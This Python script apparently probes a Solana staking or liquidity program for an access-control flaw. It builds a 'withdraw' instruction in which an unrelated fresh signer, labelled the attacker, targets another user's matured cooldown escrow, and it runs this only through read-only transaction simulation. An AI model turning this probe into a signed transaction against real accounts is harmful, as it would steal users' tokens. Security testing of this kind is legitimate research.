#!/usr/bin/env python3
"""DECISIVE E-U probe: can an unrelated FRESH signer `withdraw` a matured Cooldown
that belongs to someone else? (READ-ONLY simulateTransaction, sigVerify=false.)

Target: cooldown 7eaiKPdYedBqCSbLhUB7ktbFkK8CMjdLTAoRiAM94ZUP
  pool 0 (HcSqywSC...), authority KuBAWM6p..., index 5, unlock_ts 1785496165 (matured),
  escrow ATA 8gxZyBDPM5i5ShMohYBGknta6vLVxDQMJX8Q4FdXFFYV holding 5.862677 LP (Aa1uLLCF...).
"""
import sys, os, json, base64, hashlib
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from solrpc import rpc, b58e
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.message import Message
from solders.transaction import Transaction
from solders.hash import Hash
from solders.signature import Signature

RLP = Pubkey.from_string("JrXLmS6aYJNJDVxdAfjNJE5wikT8ubf3TA9iL2JA9Av")
SYSTEM = Pubkey.from_string("11111111111111111111111111111111")
TOKEN = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
ATA_PROG = Pubkey.from_string("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
def disc(n): return hashlib.sha256(("global:" + n).encode()).digest()[:8]
def pda(seeds): return Pubkey.find_program_address(seeds, RLP)[0]
SETTINGS = pda([b"settings"])

POOL0 = "HcSqywSCt1tQ9XPD2ztEmZ3kaWc1ZgB7vs8GxCbbH7pw"
LP0 = "Aa1uLLCFrJ3tLsKZnnxomovBDcikxTyNJEHwje7k9xNE"
COOLDOWN = "7eaiKPdYedBqCSbLhUB7ktbFkK8CMjdLTAoRiAM94ZUP"
ESCROW = "8gxZyBDPM5i5ShMohYBGknta6vLVxDQMJX8Q4FdXFFYV"
ASSET0 = "AvZZF1YaZDziPY2RCK4oJrRVrbN3mTD9NL24hPeaZeUj"
POOL_ATA0 = "Dh1sPTGc9YycHKnw5t4S1Ss24TtcoWTiD61azGSmtoS5"   # pool 0's ATA for asset0
def ata(mint, owner):
    return Pubkey.find_program_address([bytes(Pubkey.from_string(owner)), bytes(TOKEN),
                                        bytes(Pubkey.from_string(mint))], ATA_PROG)[0]

def simulate(ixs, label, payer=None):
    payer = payer or Pubkey.new_unique()
    msg = Message.new_with_blockhash(ixs, payer, Hash.default())
    tx = Transaction.populate(msg, [Signature.default()] * msg.header.num_required_signatures)
    raw = base64.b64encode(bytes(tx)).decode()
    r = rpc("simulateTransaction", [raw, {"encoding": "base64", "sigVerify": False,
                                          "replaceRecentBlockhash": True, "commitment": "processed"}])
    val = (r.get("result") or {}).get("value") or {}
    print(f"\n===== {label} =====")
    print("  payer:", payer)
    print("  err:", json.dumps(val.get("err")) if val.get("err") else None, " units:", val.get("unitsConsumed"))
    for l in (val.get("logs") or []):
        if "Instruction:" in l or "AnchorError" in l or "failed" in l or "Error Code" in l or "consumed" in l:
            print("   ", l)
    return val

data = bytes(disc("withdraw")) + bytes([0]) + (5).to_bytes(8, "little")  # pool_id=0, cooldown_id=5
variants = {
    "V1 docs order (signer,settings,permissions,pool,lp_mint,escrow,cooldown,token,system)+rem[asset,pool_ata,signer_ata]": [
        AccountMeta(Pubkey.new_unique(), True, True),  # signer (attacker)
        AccountMeta(SETTINGS, False, True),
        AccountMeta(RLP, False, False),  # permissions (absent -> program id per Anchor convention)
        AccountMeta(Pubkey.from_string(POOL0), False, True),
        AccountMeta(Pubkey.from_string(LP0), False, True),
        AccountMeta(Pubkey.from_string(ESCROW), False, True),
        AccountMeta(Pubkey.from_string(COOLDOWN), False, True),
        AccountMeta(TOKEN, False, False),
        AccountMeta(SYSTEM, False, False),
        AccountMeta(Pubkey.from_string(ASSET0), False, False),
        AccountMeta(Pubkey.from_string(POOL_ATA0), False, True),
        AccountMeta(ata(ASSET0, "11111111111111111111111111111111"), False, True),
    ],
}
for k, accs in variants.items():
    simulate([Instruction(RLP, data, accs)], k)

# Also probe migrate_cooldown with the same fresh signer
data2 = bytes(disc("migrate_cooldown"))
print("\n[note] migrate_cooldown args unknown; probing with empty args for dispatch name")
